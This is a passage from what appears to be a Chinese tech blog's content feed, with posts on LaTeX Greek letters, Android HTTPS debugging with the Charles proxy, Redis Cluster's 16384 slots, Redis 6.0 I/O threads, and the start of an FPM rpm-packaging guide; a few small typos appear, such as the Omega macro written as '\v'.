align="center"><code>P</code></td><td align="center">ρ</td><td align="center"><code>\rho</code></td></tr><tr><td align="center">Σ</td><td align="center"><code>\Sigma</code></td><td align="center">σ</td><td align="center"><code>\sigma</code></td></tr><tr><td align="center">T</td><td align="center"><code>T</code></td><td align="center">τ</td><td align="center"><code>\tau</code></td></tr><tr><td align="center">Υ</td><td align="center"><code>\Upsilon</code></td><td align="center">υ</td><td align="center"><code>\upsilon</code></td></tr><tr><td align="center">Φ</td><td align="center"><code>\Phi</code></td><td align="center">ϕ</td><td align="center"><code>\phi</code></td></tr><tr><td align="center">X</td><td align="center"><code>X</code></td><td align="center">χ</td><td align="center"><code>\chi</code></td></tr><tr><td align="center">Ψ</td><td align="center"><code>\Psi</code></td><td align="center">ψ</td><td align="center"><code>\psi</code></td></tr><tr><td align="center">Ω</td><td align="center"><code>\v</code></td><td align="center">ω</td><td align="center"><code>\omega</code></td></tr></tbody></table><h1 id="三、目前使用的问题"><a href="#三、目前使用的问题" class="headerlink" title="三、目前使用的问题"></a>三、目前使用的问题</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Charles工具的介绍与使用</title>
      <link href="/2019/09/13/charles/"/>
      <url>/2019/09/13/charles/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p><a href="https://www.charlesproxy.com/">Charles</a>是MacOS上的最常用的抓包工具，目前最新版本为<a href="https://www.charlesproxy.com/documentation/version-history/">4.2.8</a>，这里记录一下如何使用Charles在MacOS下对于安卓手机进行抓包。</p><h2 id="二、操作"><a href="#二、操作" class="headerlink" title="二、操作"></a>二、操作</h2><h3 id="2-1、前提条件"><a href="#2-1、前提条件" class="headerlink" title="2.1、前提条件"></a>2.1、前提条件</h3><ul><li><code>环境与软件</code>：自行安装，不做介绍<ul><li><code>环境</code>：Charles本身依赖于Java环境，因此需要确保MacOS本身已经安装配置完成Java的环境；</li><li><code>软件</code>：MacOS端安装成功Charles，并且配置完成所需要抓取的网址信息；</li></ul></li><li><code>设备关联</code>：安卓手机和Mac处于同一个局域网中，并且将指定的代理服务器配置为Charles实际所监听的IP和端口；</li><li><code>证书安装</code>：安卓手机安装完成<code>Charles SSL CA证书</code>，证书的获取方式下文会详细介绍（仅用于抓取https的数据包）；</li><li><code>抓包分析</code>：开始抓包分析即可；</li></ul><h3 id="2-2、设备关联"><a href="#2-2、设备关联" class="headerlink" title="2.2、设备关联"></a>2.2、设备关联</h3><h4 id="2-2-1、MacOS软件配置验证："><a href="#2-2-1、MacOS软件配置验证：" class="headerlink" title="2.2.1、MacOS软件配置验证："></a>2.2.1、MacOS软件配置验证：</h4><ul><li>确保MacOS端<code>Charles</code>的<code>macOS Proxy</code>处于开启状态：</li></ul><p><img src="https://cdn.bugwz.com/macos-proxy-switch.png" alt="macOS Proxy开关"></p><ul><li><p>查看<code>Charles</code>的<code>Proxy Settings…</code>的相关设置信息：</p><p><img src="https://cdn.bugwz.com/proxy-settings.png" alt="Proxy Settings…配置"></p></li><li><p>查看MacOS的局域网IP信息：</p></li></ul><p><img src="https://cdn.bugwz.com/ip-info.png" alt="本机IP信息"></p><h4 id="2-2-2、安卓端网络配置："><a href="#2-2-2、安卓端网络配置：" class="headerlink" title="2.2.2、安卓端网络配置："></a>2.2.2、安卓端网络配置：</h4><ul><li>网络代理信息设置：</li></ul><p><img src="https://cdn.bugwz.com/phone-network-setting.png" alt="手机端代理配置"></p><h4 id="2-2-3、连接关系确认："><a href="#2-2-3、连接关系确认：" class="headerlink" title="2.2.3、连接关系确认："></a>2.2.3、连接关系确认：</h4><ul><li><code>Charles</code>中会弹出类似以下弹窗，请求确认是否允许连接访问<code>Charles</code>，如果禁止将导致安卓端无法联网，选择<code>Allow</code>后连接关系建立；</li></ul><p><img src="https://cdn.bugwz.com/allow-connection.png" alt="Charles的连接通知"></p><h3 id="2-3、证书安装"><a href="#2-3、证书安装" class="headerlink" title="2.3、证书安装"></a>2.3、证书安装</h3><ul><li><code>证书下载</code>：手机访问：<a href="http://www.charlesproxy.com/getssl/%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%B8%8B%E8%BD%BDCharles%E7%9A%84%E7%9B%B8%E5%85%B3%E8%AE%A4%E8%AF%81%E8%AF%81%E4%B9%A6%EF%BC%88%E7%A1%AE%E4%BF%9D%E6%AD%A4%E6%97%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%B7%B2%E7%BB%8F%E4%B8%8EMacOS%E5%A4%84%E4%BA%8E%E5%90%8C%E4%B8%80%E4%B8%AA%E5%B1%80%E5%9F%9F%E7%BD%91%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%B7%B2%E7%BB%8F%E9%85%8D%E7%BD%AE%E4%BA%86%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%90%A6%E5%88%99%E5%B0%86%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6%EF%BC%89%EF%BC%9B">http://www.charlesproxy.com/getssl/，就会自动下载Charles的相关认证证书（确保此时安卓手机已经与MacOS处于同一个局域网，并且手机端已经配置了代理服务器的信息，否则将无法下载证书）；</a></li><li><code>证书安装</code>：点击下载后的证书，进行安装；<ul><li><code>证书名称</code>：为了明确区分该证书的用途以及来源，最好名称比较直观，建议直接使用<code>Charles</code>即可；</li><li><code>凭据用途</code>：请选择<code>WLAN</code>即可；</li></ul></li></ul><p><img src="https://cdn.bugwz.com/ca-ssl.png" alt="安卓端证书安装"></p><h3 id="2-4、抓包分析"><a href="#2-4、抓包分析" class="headerlink" title="2.4、抓包分析"></a>2.4、抓包分析</h3><p>最后即可直接抓包分析即可；</p>]]></content>
      
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> MacOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么RedisCluster采用16384个槽位?</title>
      <link href="/2019/09/06/redis-cluster-slots-num/"/>
      <url>/2019/09/06/redis-cluster-slots-num/</url>
      
        <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p><code>RedisCluster</code>目前使用的计算<code>slot</code>槽位的算法为<code>CRC16</code>，该算法本身会产生的<code>hash</code>值的大小为<code>16bit</code>，因此该算法可以产生<code>2^16=65536</code>个不同的值，取值范围为<code>0～65535</code>之间，从下面的代码中我们看到，目前限制的<code>slot</code>槽位的个数为<code>16384</code>（相关的代码为<code>crc16(key+s+1,e-s-1) &amp; 0x3FFF</code>）；</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We have 16384 hash slots. The hash slot of a given key is obtained</span></span><br><span class="line"><span class="comment"> * as the least significant 14 bits of the crc16 of the key.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * However if the key contains the &#123;...&#125; pattern, only the part between</span></span><br><span class="line"><span class="comment"> * &#123; and &#125; is hashed. This may be useful in the future to force certain</span></span><br><span class="line"><span class="comment"> * keys to be in the same node (assuming no resharding is in progress). */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">keyHashSlot</span><span class="params">(<span class="type">char</span> *key, <span class="type">int</span> keylen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, e; <span class="comment">/* start-end indexes of &#123; and &#125; */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (s = <span class="number">0</span>; s &lt; keylen; s++)</span><br><span class="line">        <span class="keyword">if</span> (key[s] == <span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No &#x27;&#123;&#x27; ? Hash the whole key. This is the base case. */</span></span><br><span class="line">    <span class="keyword">if</span> (s == keylen) <span class="keyword">return</span> crc16(key,keylen) &amp; <span class="number">0x3FFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &#x27;&#123;&#x27; found? Check if we have the corresponding &#x27;&#125;&#x27;. */</span></span><br><span class="line">    <span class="keyword">for</span> (e = s+<span class="number">1</span>; e &lt; keylen; e++)</span><br><span class="line">        <span class="keyword">if</span> (key[e] == <span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No &#x27;&#125;&#x27; or nothing between &#123;&#125; ? Hash the whole key. */</span></span><br><span class="line">    <span class="keyword">if</span> (e == keylen || e == s+<span class="number">1</span>) <span class="keyword">return</span> crc16(key,keylen) &amp; <span class="number">0x3FFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we are here there is both a &#123; and a &#125; on its right. Hash</span></span><br><span class="line"><span class="comment">     * what is in the middle between &#123; and &#125;. */</span></span><br><span class="line">    <span class="keyword">return</span> crc16(key+s+<span class="number">1</span>,e-s<span class="number">-1</span>) &amp; <span class="number">0x3FFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么槽位个数的时候为什么不直接采用65536呢？作者在2015年5月在相关的<a href="https://github.com/antirez/redis/issues/2576">issue#2576</a>上就给出了答案，作者的回复如下：</p><p><img src="https://cdn.bugwz.com/slotsNum.png" alt="antirze的回复"></p><p>作者这句话的翻译如下所示：</p><blockquote><p>原因是：</p><ol><li>正常的心跳包会携带着节点的完整配置，通过使用与旧的配置信息幂等的配置来更新旧配置。 这意味着它们需要包含原始形式的节点的插槽配置信息，使用16384个slots的话将会占用2k的空间，但是如果使用65536个slots的话将会占用8k空间。 </li><li>同时，由于其他设计权衡，RedisCluster不太可能扩展到超过1000个Master节点。</li></ol><p>所以16384在正确的范围内可以确保每个Master有足够的插槽，最多1000个Master，但是足够小的slots数字可以很容易地将slots的配置作为原始位图数据进行传播。 请注意，在小型集群中，位图难以压缩，因为当N很小时，位图将设置slots&#x2F;N位，这个是一个很大的比特集。</p></blockquote><h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h2><p>依据作者给出的答案，作者吧原因定位于<strong>带宽消耗</strong>以及<strong>使用现状</strong>方面，接下来详细说明一下这样设置的原因，RedisCluster使用<code>cluster meet &lt;ip&gt; &lt;port&gt; [bus-port]</code>指令将节点连接到工作集群中，例如将两个redis实例<code>10.0.0.1:6379</code>和<code> 10.0.0.2:6379</code>加入到集群中，我们可以使用<code>redis-cli</code>连接上<code>10.0.0.1:6379</code>，执行<code>cluster meet 10.0.0.2:6379</code>使两个节点建立连接，后续这两个节点就会定期发送<code>ping/pong</code>来交换数据信息。</p><p>这里分析一下在节点数据交换的过程中的几个重点：</p><ul><li>节点交换的数据类型与大小；</li><li>节点数据交换的频率；</li></ul><h3 id="2-1、节点交换的数据类型与大小"><a href="#2-1、节点交换的数据类型与大小" class="headerlink" title="2.1、节点交换的数据类型与大小"></a>2.1、节点交换的数据类型与大小</h3><p>在RedisCluster的不同节点通信过程中，会调用<code>clusterSendPing(clusterLink *link, int type)</code>，依据<code>type</code>区分类型，然后调用<code>clusterBuildMessageHdr()；</code>和<code>clusterSendMessage()；</code>函数构建并发送消息，下面是节点的消息类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Message types.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that the PING, PONG and MEET messages are actually the same exact</span></span><br><span class="line"><span class="comment"> * kind of packet. PONG is the reply to ping, in the exact format as a PING,</span></span><br><span class="line"><span class="comment"> * while MEET is a special PING that forces the receiver to add the sender</span></span><br><span class="line"><span class="comment"> * as a node (if it is not already in the list). */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_PING 0          <span class="comment">/* Ping */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_PONG 1          <span class="comment">/* Pong (reply to Ping) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_MEET 2          <span class="comment">/* Meet &quot;let&#x27;s join&quot; message */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_FAIL 3          <span class="comment">/* Mark node xxx as failing */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_PUBLISH 4       <span class="comment">/* Pub/Sub Publish propagation */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_FAILOVER_AUTH_REQUEST 5 <span class="comment">/* May I failover? */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_FAILOVER_AUTH_ACK 6     <span class="comment">/* Yes, you have my vote */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_UPDATE 7        <span class="comment">/* Another node slots configuration */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_MFSTART 8       <span class="comment">/* Pause clients for manual failover */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_MODULE 9        <span class="comment">/* Module cluster API message. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTERMSG_TYPE_COUNT 10        <span class="comment">/* Total number of message types. */</span></span></span><br></pre></td></tr></table></figure><h4 id="2-1-1、消息头信息"><a href="#2-1-1、消息头信息" class="headerlink" title="2.1.1、消息头信息"></a>2.1.1、消息头信息</h4><p>在节点通信过程中，节点之间需要进行数据交换，以下结构体是节点之间进行数据交换的基础信息：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CLUSTER_SLOTS 16384</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> sig[<span class="number">4</span>];        <span class="comment">/* 签名“RCmb”（Redis群集消息总线） */</span></span><br><span class="line">    <span class="type">uint32_t</span> totlen;    <span class="comment">/* 消息的总长度 */</span></span><br><span class="line">    <span class="type">uint16_t</span> ver;       <span class="comment">/* 协议版本，目前设置为1 */</span></span><br><span class="line">    <span class="type">uint16_t</span> port;      <span class="comment">/* TCP基本端口号r. */</span></span><br><span class="line">    <span class="type">uint16_t</span> type;      <span class="comment">/* 消息类型 */</span></span><br><span class="line">    <span class="type">uint16_t</span> count;     <span class="comment">/* 仅用于某种消息 */</span></span><br><span class="line">    <span class="type">uint64_t</span> currentEpoch;  <span class="comment">/* 相应于发送节点的纪元 */</span></span><br><span class="line">    <span class="type">uint64_t</span> configEpoch;   <span class="comment">/* 如果是主服务器的配置纪元，或者如果它是从</span></span><br><span class="line"><span class="comment">     服务器则由其主服务器通告的最后一个纪元 */</span></span><br><span class="line">    <span class="type">uint64_t</span> offset;    <span class="comment">/* 如果节点是从属节点，则节点是主节点或已处理的</span></span><br><span class="line"><span class="comment">     复制偏移量时，主复制偏移量 */</span></span><br><span class="line">    <span class="type">char</span> sender[CLUSTER_NAMELEN]; <span class="comment">/* 发件人节点的名称 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> myslots[CLUSTER_SLOTS/<span class="number">8</span>]; <span class="comment">/* 发送节点负责的槽信息 */</span></span><br><span class="line">    <span class="type">char</span> slaveof[CLUSTER_NAMELEN]; <span class="comment">/* 如果发送节点是从节点，记录对应主节点的nodeId */</span></span><br><span class="line">    <span class="type">char</span> myip[NET_IP_STR_LEN];    <span class="comment">/* 发件人IP，如果不存在则为零 */</span></span><br><span class="line">    <span class="type">char</span> notused1[<span class="number">34</span>];  <span class="comment">/* 34个保留字节供将来使用 */</span></span><br><span class="line">    <span class="type">uint16_t</span> cport;      <span class="comment">/* Sender TCP集群总线端口 */</span></span><br><span class="line">    <span class="type">uint16_t</span> flags;      <span class="comment">/* 发件人节点标志 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> state; <span class="comment">/* 来自发件人POV的集群状态 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mflags[<span class="number">3</span>]; <span class="comment">/* 消息标志：CLUSTERMSG_FLAG [012] _... */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">clusterMsgData</span> <span class="title">data</span>;</span> <span class="comment">/* 群集消息数据 */</span></span><br><span class="line">&#125; clusterMsg;</span><br></pre></td></tr></table></figure><p>这里只讨论与slots相关的<code>unsigned char myslots[CLUSTER_SLOTS/8];</code>这一项信息，该项为一个<code>char</code>数组，这个数组实际上是一个<code>bitmap</code>，这个<code>bitmap</code>的每一位表示一个槽，如果对应的槽位为<code>1</code>，代表对应的槽位是属于该节点的。</p><p>分析整个结构体可以看出其中空间占用最大的就是<code>unsigned char myslots[CLUSTER_SLOTS/8];</code>这一项，占用空间<code>16384/8/1024=2kb</code>，因此，如果槽位为<code>65536</code>，发送心跳信息的消息头达<code>8k</code>，发送的心跳包过于庞大；</p><h3 id="2-1-2、消息体信息"><a href="#2-1-2、消息体信息" class="headerlink" title="2.1.2、消息体信息"></a>2.1.2、消息体信息</h3><p>在消息体中，会携带一定数量的其他节点信息用于交换。其他节点的信息的数量约为集群总节点数量的1&#x2F;10，至少携带3个节点的信息，<strong>节点数量越多，消息体内容越大</strong>，10个节点状态下的消息体的大小大概约为1Kb左右；</p><p>具体消息体的信息是？？？待分析</p><h2 id="2-2、节点数据交换的频率"><a href="#2-2、节点数据交换的频率" class="headerlink" title="2.2、节点数据交换的频率"></a>2.2、节点数据交换的频率</h2><p><code>Cluster</code>节点之间的<code>ping/pong</code>操作由<code>clusterCron()</code>函数不断触发，该函数每秒执行<code>10</code>次，在<code>clusterCron()</code>函数中，每调用<code>10</code>次，执行一次<code>Cluster</code>节点的<code>ping</code>操作，相关代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 每秒执行10次 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clusterCron</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">  <span class="comment">/* 每10次迭代对一些随机节点进行1次ping操作，这样我们通常每秒ping一个随机节点 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(iteration % <span class="number">10</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 检查几个随机节点并使用最早的pong_received时间ping一个节点. */</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">            de = dictGetRandomKey(server.cluster-&gt;nodes);</span><br><span class="line">            clusterNode *this = dictGetVal(de);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Don&#x27;t ping nodes disconnected or with a ping currently active.</span></span><br><span class="line"><span class="comment">            /* 不要ping断开连接的节点或当前活跃的节点. */</span></span><br><span class="line">            <span class="keyword">if</span> (this-&gt;link == <span class="literal">NULL</span> || this-&gt;ping_sent != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (this-&gt;flags &amp; (CLUSTER_NODE_MYSELF|CLUSTER_NODE_HANDSHAKE))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (min_pong_node == <span class="literal">NULL</span> || min_pong &gt; this-&gt;pong_received) &#123;</span><br><span class="line">                min_pong_node = this;</span><br><span class="line">                min_pong = this-&gt;pong_received;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min_pong_node) &#123;</span><br><span class="line">            serverLog(LL_DEBUG,<span class="string">&quot;Pinging node %.40s&quot;</span>, min_pong_node-&gt;name);</span><br><span class="line">            clusterSendPing(min_pong_node-&gt;link, CLUSTERMSG_TYPE_PING);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">  di = dictGetSafeIterator(server.cluster-&gt;nodes);</span><br><span class="line">    <span class="keyword">while</span>((de = dictNext(di)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">      <span class="comment">/* 如果我们当前在此实例中没有活动的ping，并且收到的PONG早于</span></span><br><span class="line"><span class="comment">       * 群集超时的一半，则立即发送新的ping，以确保所有节点都被ping，</span></span><br><span class="line"><span class="comment">       * 而没有太大的延迟 */</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;link &amp;&amp;</span><br><span class="line">            node-&gt;ping_sent == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (now - node-&gt;pong_received) &gt; server.cluster_node_timeout/<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            clusterSendPing(node-&gt;link, CLUSTERMSG_TYPE_PING);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">&#125;</span><br><span class="line">   dictReleaseIterator(di);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的大致逻辑是：</p><ul><li>每次（秒）会随机选取<code>5个</code>节点，找出最久没有通信的节点发送<code>ping</code>消息；</li><li>每<code>100毫秒</code>(<code>1秒10次</code>)都会扫描本地节点列表，如果发现节点最近一次接受<code>pong</code>消息的时间大于<code>cluster-node-timeout/2</code>则立刻发送<code>ping</code>消息；</li></ul><p><strong>因此我们可以计算出每秒单节点发出的ping消息的数量为：</strong></p><p><code>1+10*numOf(node.pong_received&gt;cluster_node_timeout/2)</code></p><p>针对于大致的带宽消耗，《Redis的开发与运维》中在第10章 集群的集群运维 - 带宽消耗小节中，有这么一句话：</p><blockquote><p>例如，一个总节点数为200的Redis集群，部署在20台物理机上每台划分10个节点，cluster-node-timeout采用默认15秒，这时ping&#x2F;pong消息占用带宽达到25Mb。如果把cluster-node-timeout设为20，对带宽的消耗降低到15Mb以下。</p></blockquote><ul><li>相关链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIwMDgzMjc3NA==&mid=247484663&idx=1&sn=bffafa6cbaa2a0bdf8ab487901867932&utm_source=tuicool&utm_medium=referral">面试官:知道为什么RedisCluster有16384个槽么?</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis的多线程特性</title>
      <link href="/2019/09/01/redis-multithreading/"/>
      <url>/2019/09/01/redis-multithreading/</url>
      
        <content type="html"><![CDATA[<p>Redis6.0即将发布，比较吸引我的便是Redis6.0支持的多线程技术，Redis本身也并不是简单的单进程&#x2F;线程模型，包括bgsave的进程以及对于一些慢请求的io线程（惰性删除，日志刷盘等），这次多线程的优化主要解决了Redis单进程&#x2F;线程处理模型在协议解析以及网络IO上的消耗问题，在命令的处理上仍旧是单线程。</p><h2 id="一、逻辑分析"><a href="#一、逻辑分析" class="headerlink" title="一、逻辑分析"></a>一、逻辑分析</h2><h3 id="2-1、两个配置"><a href="#2-1、两个配置" class="headerlink" title="2.1、两个配置"></a>2.1、两个配置</h3><ul><li><code>io-threads</code>：启用的IO的线程数，最大为128（老版本中配置判断为512，新版本已经修复统一为128）；</li><li><code>io-threads-do-reads</code>：是否启用IO多线程；</li></ul><h3 id="2-2、两个队列"><a href="#2-2、两个队列" class="headerlink" title="2.2、两个队列"></a>2.2、两个队列</h3><ul><li><code>clients_pending_read</code>：待处理的客户端的请求数据队列（需要进行协议解析等操作）；</li><li><code>clients_pending_write</code>：待处理的客户端的回复数据队列（需要进行回复客户端等操作）；</li></ul><h3 id="2-3、两类线程"><a href="#2-3、两类线程" class="headerlink" title="2.3、两类线程"></a>2.3、两类线程</h3><p><strong>注意：启用的所有的多线程在同一时刻执行的任务类型是一样的</strong></p><ul><li><code>IO_THREADS_OP_WRITE</code>：执行<code>clients_pending_read</code>任务的线程；</li><li><code>IO_THREADS_OP_READ</code>：执行<code>clients_pending_write</code>任务的线程；</li></ul><h3 id="2-4、多个函数"><a href="#2-4、多个函数" class="headerlink" title="2.4、多个函数"></a>2.4、多个函数</h3><ul><li><p><code>initThreadedIO</code>：初始化多线程，并将多线程置为停止状态；</p></li><li><p><code>startThreadedIO</code>：启动多线程，并将<code>io_threads_active</code>状态置为<code>1</code>；</p></li><li><p><code>stopThreadedIO</code>：停止多线程，并将<code>io_threads_active</code>状态置为<code>0</code>，需要处理多线程中未处理完成的任务；</p></li><li><p><code>IOThreadMain</code>：多线程的执行函数，依据多线程的操作不同（<code>IO_THREADS_OP_WRITE</code>&#x2F;<code>IO_THREADS_OP_READ</code>）执行对应的客户端的回复或者读取操作；</p></li><li><p><code>handleClientsWithPendingWritesUsingThreads</code>：将<code>clients_pending_write</code>队列中待处理的处理客户端的<code>回复</code>分配给线程进行回复等操作；</p></li><li><p><code>handleClientsWithPendingReadsUsingThreads</code>：将<code>clients_pending_read</code>队列中待处理的客户端的<code>请求</code>分配给处理线程进行协议解析等操作，然后执行相应的命令逻辑；</p></li><li><p><code>afterSleep</code>：事件循环执行完成之后调用，函数内会调用<code>handleClientsWithPendingReadsUsingThreads</code>函数；</p></li><li><p><code>processCommandAndResetClient</code>：封装了<code>processCommand</code>函数，增加多线程模型的情况的处理逻辑；</p></li><li><p><code>postponeClientRead</code>：依据是否启动多线程，直接处理客户端的请求还是将请求添加到待处理队列<code>clients_pending_read</code>中；</p></li><li><p><code>stopThreadedIOIfNeeded</code>：如果<code>clients_pending_write</code>较小，即客户端数量较少时自动停止多线程；</p></li></ul><p><img src="https://cdn.bugwz.com/redis-multithreading.png" alt="逻辑示意图"></p><p>参考文档：<a href="https://mp.weixin.qq.com/s/6WQNq5dNk-GuEhZXtVCo-A">https://mp.weixin.qq.com/s/6WQNq5dNk-GuEhZXtVCo-A</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用FPM优雅的进行rpm打包</title>
      <link href="/2019/08/27/use-fpm-to-mkrpm/"/>
      <url>/2019/08/27/use-fpm-to-mkrpm/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>对于有过构建rpm安装包相关操作的应该知道可以使用<code>spec文件</code>以及<code>rpmbuild指令</code>进行打包操作，不过<code>spec文件</code>的编写也是一个十分令人头懂的事情，我之前曾经有过一篇使用spec文件打包的文章，参考<a href="https://www.bugwz.com/2019/01/01/make-rpm/">RPM打包记录</a>，这里介绍一个更高效，更人性化的打包工具：<a href="https://github.com/jordansissel/fpm">FPM</a>。</p><p>FPM是一个快速高效的打包工具，该工具本身为Ruby的一个模块，因此使用该工具之前需要安装Ruby；</p><h2 id="二、安装与使用"><a href="#二、安装与使用" class="headerlink" title="二、安装与使用"></a>二、安装与使用</h2><h3 id="2-1、安装"><a href="#2-1、安装" class="headerlink" title="2.1、安装"></a>2.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装ruby</span></span><br><span class="line">yum -y install ruby rubygems ruby-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换国内的ruby镜像</span></span><br><span class="line">gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证镜像是否替换成功</span></span><br><span class="line">gem sources -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装fpm</span></span><br><span class="line">gem install fpm</span><br></pre></td></tr></table></figure><h3 id="2-2、参数介绍"><a href="#2-2、参数介绍" class="headerlink" title="2.2、参数介绍"></a>2.2、参数介绍</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-f :强制覆盖[覆盖同名rpm包]</span><br><span class="line">-n :指定的rpm包名</span><br><span class="line">-p :指定的rpm包文件放置位置，最后将rpm存放在该路径下；</span><br><span class="line">-v :指定的rpm包版本</span><br><span class="line">-d :指定依赖的软件   ( [-d <span class="string">&#x27;name&#x27;</span>] or [-d <span class="string">&#x27;name &gt; version&#x27;</span>] 例子: -d <span class="string">&#x27;libstdc++ &gt;= 4.4.3&#x27;</span>)</span><br><span class="line">-a :指定系统架构,如果是noarch则为<span class="string">&#x27;-a all&#x27;</span> 或者 <span class="string">&#x27;-a native&#x27;</span> [x86_64] 当软件不区分64位或32位的时候可以 noarch</span><br><span class="line">-s :指定input的数据类型，默认为<span class="built_in">dir</span>数据类型，支持的源类型：<span class="string">&quot;dir&quot;</span> <span class="string">&quot;rpm&quot;</span> <span class="string">&quot;gem&quot;</span> <span class="string">&quot;python&quot;</span> <span class="string">&quot;empty&quot;</span> <span class="string">&quot;tar&quot;</span> <span class="string">&quot;deb&quot;</span> <span class="string">&quot;cpan&quot;</span> <span class="string">&quot;npm&quot;</span> <span class="string">&quot;osxpkg&quot;</span> <span class="string">&quot;pear&quot;</span> <span class="string">&quot;pkgin&quot;</span> <span class="string">&quot;virtualenv&quot;</span> <span class="string">&quot;zip&quot;</span></span><br><span class="line">-m :指定打包人员[Packager]  ([ -m <span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">-C :指定打包的相对路径,类似于buildroot. 比如 -C /tmp/apr/，同时在 /tmp/apr/ 目录下存在一个 usr/local/bin/ 